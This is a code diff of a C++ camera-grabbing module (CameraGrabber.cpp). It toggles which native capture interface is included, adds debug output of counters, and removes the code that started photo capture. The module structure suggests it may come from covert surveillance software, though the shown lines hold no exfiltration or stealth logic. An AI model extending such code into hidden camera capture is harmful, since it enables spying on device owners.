@@ -6,13 +6,14 @@
 
 #include "wtypes.h"
 
-/*****
+
 #include "NativePhotoCaptureInterface.h"
 using namespace NativePhotoCaptureInterface::Native;
-*****/
 
+/*****
 #include "NativeCameraCaptureInterface.h"
 using namespace NativeCameraCaptureInterface::Native;
+*****/
 
 extern "C" int conta;
 extern "C"  int contaCameraCapturePreviewSink;
@@ -55,15 +56,17 @@ DWORD WINAPI CameraModule(LPVOID lpParam) {
 	
 	DBG_TRACE(L"Debug - CameraGrabber.cpp - Camera Module is Alive\n", 5, FALSE);
 
-	/*****
+	
 	NativeCapture^ photoCapture = ref new NativeCapture();
 	photoCapture=nullptr;
-	*****/
+	
 		
 		wchar_t msgW[128];
 		char msgA[128];
 		swprintf_s(msgW,L"conta=%i\ncontaCameraCapturePreviewSink=%i\ncontaCameraCaptureSampleSink=%i\n",conta,contaCameraCapturePreviewSink,contaCameraCaptureSampleSink );
 		wcstombs(msgA, msgW, wcslen(msgW)+1);
+
+		OutputDebugStringA(msgA);
 
 		fstream filestr;
 		char buff[DTTMSZ];
@@ -74,19 +77,8 @@ DWORD WINAPI CameraModule(LPVOID lpParam) {
 		filestr.close();
 
 
-	conta++;
-	if(conta==1)
-	{
-		photoCapture = ref new NativeCapture();
-		photoCapture->StartCapture();
-	//NativeCapture^ photoCapture = ref new NativeCapture();
-	//photoCapture=nullptr;
-	}
-	else
-	{
-			photoCapture->StartCapture();
-			
-	}
+		conta++;
+
 
 
 	me->setStatus(MODULE_STOPPED);
